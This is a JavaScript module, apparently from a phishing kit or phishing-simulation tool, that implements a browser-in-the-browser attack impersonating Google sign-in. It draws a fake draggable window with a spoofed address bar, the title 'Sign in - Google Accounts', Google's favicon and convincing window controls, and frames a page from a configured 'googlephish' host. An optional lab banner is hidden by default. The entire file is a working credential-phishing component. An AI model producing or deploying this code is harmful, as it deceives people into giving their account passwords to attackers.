(function (global) {
    function cfg() {
        return global.APP_CONFIG || {};
    }

    function normalizeBase(url) {
        if (!url || typeof url !== 'string') return '';
        return url.replace(/\/+$/, '');
    }

    function getOverlay() { return document.getElementById('bitbOverlay'); }
    function getFrame()   { return document.getElementById('bitbFrame');   }

    function entryPath() {
        var p = String(cfg().bitbEntryPath || '/index.php').trim();
        if (!p.startsWith('/')) p = '/' + p;
        return p;
    }

    function populateUrl(displayUrl) {
        var host = displayUrl, path = '';
        try {
            var parsed = new URL(displayUrl);
            host = parsed.host;
            path = parsed.pathname + parsed.search + parsed.hash;
        } catch (_) {}
        var d = document.getElementById('bitbWinDomainName');
        var p = document.getElementById('bitbWinDomainPath');
        if (d) d.textContent = host;
        if (p) p.textContent = path;
    }

    function open() {
        var base = normalizeBase(cfg().googlephishBaseUrl);
        if (!base) return false;

        var overlay = getOverlay();
        var frame   = getFrame();
        if (!overlay || !frame) return false;

        var displayUrl = String(cfg().bitbDisplayUrl || base + entryPath()).trim();
        var tabTitle   = String(cfg().bitbTabTitle   || 'Sign in - Google Accounts').trim();
        var fav        = String(cfg().bitbFaviconUrl || 'https://www.google.com/favicon.ico').trim();
        var label      = String(cfg().bitbLabLabel   || '').trim();

        populateUrl(displayUrl);

        var titleEl = document.getElementById('bitbWinTitle');
        if (titleEl) titleEl.textContent = tabTitle;

        var favEl = document.getElementById('bitbWinFavicon');
        if (favEl && fav) favEl.src = fav;

        var labEl = document.getElementById('bitbLabBanner');
        if (labEl) {
            if (label) { labEl.textContent = label; labEl.hidden = false; }
            else       { labEl.textContent = '';    labEl.hidden = true;  }
        }

        frame.src = base + entryPath();
        overlay.hidden = false;
        overlay.setAttribute('aria-hidden', 'false');
        document.body.style.overflow = 'hidden';

        function onKey(e) { if (e.key === 'Escape') close(); }
        overlay._bitbOnKey = onKey;
        document.addEventListener('keydown', onKey);

        return true;
    }

    function close() {
        var overlay = getOverlay();
        var frame   = getFrame();
        if (!overlay) return;

        if (overlay._bitbOnKey) {
            document.removeEventListener('keydown', overlay._bitbOnKey);
            overlay._bitbOnKey = null;
        }

        overlay.hidden = true;
        overlay.setAttribute('aria-hidden', 'true');
        document.body.style.overflow = '';
        if (frame) frame.src = 'about:blank';
    }

    function wireDraggable() {
        var win    = document.getElementById('bitbWindow');
        var handle = document.getElementById('bitbWinTitleBar');
        if (!win || !handle) return;

        var dragging = false, startX, startY, origLeft, origTop;

        handle.addEventListener('mousedown', function (e) {
            if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) return;
            dragging = true;
            startX = e.clientX; startY = e.clientY;
            var r = win.getBoundingClientRect();
            origLeft = r.left; origTop = r.top;
            win.style.position = 'fixed';
            win.style.margin   = '0';
            win.style.left     = origLeft + 'px';
            win.style.top      = origTop  + 'px';
            e.preventDefault();
        });

        document.addEventListener('mousemove', function (e) {
            if (!dragging) return;
            win.style.left = (origLeft + e.clientX - startX) + 'px';
            win.style.top  = (origTop  + e.clientY - startY) + 'px';
        });

        document.addEventListener('mouseup', function () { dragging = false; });
    }

    function wireCloseHandlers() {
        var overlay = getOverlay();
        if (!overlay || overlay.dataset.bitbWired) return;
        overlay.dataset.bitbWired = '1';
        overlay.addEventListener('click', function (e) {
            if (e.target && e.target.closest && e.target.closest('[data-bitb-close]')) close();
        });

        // Windows control button hover effects
        var minBtn   = overlay.querySelector('.bitb-win-btn--min');
        var maxBtn   = overlay.querySelector('.bitb-win-btn--max');
        var closeBtn = overlay.querySelector('.bitb-win-btn--close');

        function addHover(el, hoverBg, hoverColor) {
            if (!el) return;
            el.addEventListener('mouseover', function () {
                el.style.backgroundColor = hoverBg;
                el.style.color = hoverColor || '';
            });
            el.addEventListener('mouseout', function () {
                el.style.backgroundColor = '';
                el.style.color = '';
            });
        }

        addHover(minBtn,   'rgba(0,0,0,0.1)', '');
        addHover(maxBtn,   'rgba(0,0,0,0.1)', '');
        addHover(closeBtn, '#e81123',          '#fff');
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () {
            wireCloseHandlers();
            wireDraggable();
        });
    } else {
        wireCloseHandlers();
        wireDraggable();
    }

    global.BitbGooglePhish = { open: open, close: close, normalizeBase: normalizeBase };
})(window);
